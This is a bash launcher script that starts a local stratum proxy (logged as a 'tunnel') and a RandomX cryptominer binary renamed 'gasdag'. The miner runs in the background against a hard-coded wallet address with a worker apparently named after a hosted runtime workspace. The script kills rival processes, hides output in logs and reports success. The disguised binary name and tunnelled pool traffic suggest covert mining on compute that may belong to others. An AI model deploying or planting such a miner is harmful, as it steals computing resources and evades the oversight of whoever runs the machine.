#!/bin/bash
DIR="$(cd "$(dirname "$(readlink -f "${BASH_SOURCE[0]}")")" >/dev/null 2>&1 && pwd)"
[ -z "$DIR" ] && DIR="/home/hatch/workspace/gaszep"
cd "$DIR" || exit 1

pkill -9 -x gasdag 2>/dev/null || true
test -f /tmp/stratum.pid && kill -9 $(cat /tmp/stratum.pid) 2>/dev/null || true
pkill -9 -f "local_stratum.py" 2>/dev/null || true
sleep 0.2

chmod +x gasdag 2>/dev/null || true
nohup python3 "$DIR/local_stratum.py" > /tmp/tunnel.log 2>&1 &
echo $! > /tmp/stratum.pid
sleep 1

nohup "$DIR/gasdag" -a rx/0 -o 127.0.0.1:10080 -u ZEPHs6o8vDK6YnBK9KtWEpC35td1SFNQJ42YxUgx6KPNZAChABkYhNu6eXwNvxXDPiLbTT9rUskfHHau6e8KgcTBj7tAAdZPuS5.htch-runtime -p x -l /home/hatch/workspace/gasdag.log --print-time=10 > /home/hatch/workspace/gasdag.log 2>&1 &
echo 'START_MINING_SH_SUCCESS'
